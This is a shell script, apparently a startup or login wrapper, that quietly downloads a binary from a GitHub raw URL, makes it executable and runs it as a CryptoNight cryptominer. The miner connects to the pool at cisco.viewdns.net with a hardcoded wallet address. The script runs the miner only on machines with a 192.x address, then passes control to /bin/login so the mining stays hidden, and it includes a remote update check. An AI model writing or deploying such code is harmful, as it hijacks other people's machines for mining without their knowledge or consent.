#!/bin/sh
#A190320
#R190320

END="cisco.viewdns.net"
PORT="80"
USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
TAG="OSRUN"

_VERATU(){
ALOCAL1=`sed -n 2p $0`
ONLINE1=`wget --no-cache -qO - https://raw.githubusercontent.com/osrun/beta/master/run.sh | sed -n 2p`
ALOCAL2=`sed -n 3p $0`
ONLINE2=`wget --no-cache -qO - https://raw.githubusercontent.com/osrun/beta/master/run.sh | sed -n 3p`

if ping google.com -c3 2> /dev/null; then
 echo "conexao ok"
for i in $(seq 2); do
 if [[ $ALOCAL$i = $ONLINE$i ]]; then
   echo "Atualizado"
  else
   echo "Atualizar"
 fi
done
 else
  echo "sem conexao"
 fi

}

_APP(){
 case $1 in
   start)  
     #sysctl -w vm.nr_hugepages=128
     wget --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
     chmod +x app
     ./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
   ;; 
 esac
}

#(
#sleep 60
#killall run
#)&

case $1 in
 -v)
    _VERATU
  ;;
  *)
   if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
    _APP start
   fi
   setsid cttyhack /bin/login
;;
esac
